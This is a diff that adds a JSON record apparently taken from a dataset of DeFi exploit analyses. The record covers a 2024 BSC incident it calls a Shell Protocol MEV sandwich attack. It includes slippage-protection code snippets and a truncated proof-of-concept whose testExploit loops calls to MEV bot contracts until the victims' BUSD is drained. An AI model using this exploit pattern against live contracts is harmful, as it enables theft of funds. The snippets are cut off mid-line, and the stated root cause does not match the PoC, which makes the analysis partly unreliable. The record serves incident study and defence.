@@ -1,0 +1,30 @@
+{
+ "id": "2024__2024-01-25_ShellProtocol_MEVSandwich",
+ "source_file": "2024/2024-01-25_ShellProtocol_MEVSandwich.md",
+ "title": "Shell Protocol MEV — Analysis of Sandwich Attack on Shell Protocol by MEV Bot",
+ "date": "2024-01-25",
+ "protocol": "Shell Protocol MEV",
+ "chain": "BSC",
+ "loss_raw": "~1,000 BUSD",
+ "loss_usd": null,
+ "root_cause": "Sandwich attack on Shell Protocol transactions by MEV bot",
+ "attack_tx": "0x24f1...d303 (block 35,273,751; from PoC source)",
+ "vulnerable_contract": "0xa898...f46 (Shell token contract; from PoC source)",
+ "classes": [
+  "mev-sandwich"
+ ],
+ "code_before": [
+  "❌ Example of vulnerable implementation\n// Issue: Sandwich attack on Shell Protocol transactions by MEV bot\n// Attacker exploits this logic to gain illegitimate profit\n\n// Shell Protocol MEV Sandwich Attack — Insufficient Slippage Protection\ninterface IPancakeRouter {\n    //",
+  "❌ Vulnerable: Setting amountOutMin=0 or too low exposes to MEV bot sandwich attacks\n    // Attacker front-runs with a large buy to raise price, victim's tx executes, attacker immediately sells\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\n//",
+  "❌ Do not rely solely on current spot price\n}"
+ ],
+ "code_after": [
+  "✅ Correct implementation: Proper slippage protection + deadline setting\nfunction safeSell(address tokenIn, address tokenOut, uint256 amountIn) external {\n    //",
+  "✅ Calculate minimum output based on on-chain price (e.g., allow 1% slippage)\n    uint256 expectedOut = getAmountOut(amountIn, tokenIn, tokenOut);\n    uint256 minAmountOut = expectedOut * 99 / 100; //"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n  │\n  ▼\n[Vulnerability Identified] ─────── Shell Protocol MEV Contract\n  │\n  ▼\n[Malicious Transaction Sent] ─ Vulnerable Function Called\n  │                              (Validation Bypassed)\n  ▼\n[Asset Drained] ──────────────── Profit Secured",
+  "// Source: DeFiHackLabs - Shell_MEV_0xa898_exp.sol\n// Chain: BSC (BNB Chain) | Date: 2024-01-25 | Block: 35,273,751\n\n    function testExploit() public {\n        BUSD.transfer(address(0x000000000000000000000000000000000000dEaD), BUSD.balanceOf(address(this)));\n        emit log_named_uint(\"Attacker BUSD balance before attack\", BUSD.balanceOf(address(this)));\n        SHELL.approve(address(Router), type(uint256).max);\n        while (BUSD.balanceOf(Victim1) > 10 * 1e18) {\n            Robot1.call(\n                abi.encodeWithSelector(\n                    bytes4(0x5f90d725), Victim2, Victim1, address(this), BUSD.balanceOf(address(Victim1)), 100, 360\n                )\n            );\n        }\n        while (BUSD.balanceOf(Victim2) > 10 * 1e18) {\n            Robot2.call(\n                abi.encod"
+ ]
+}
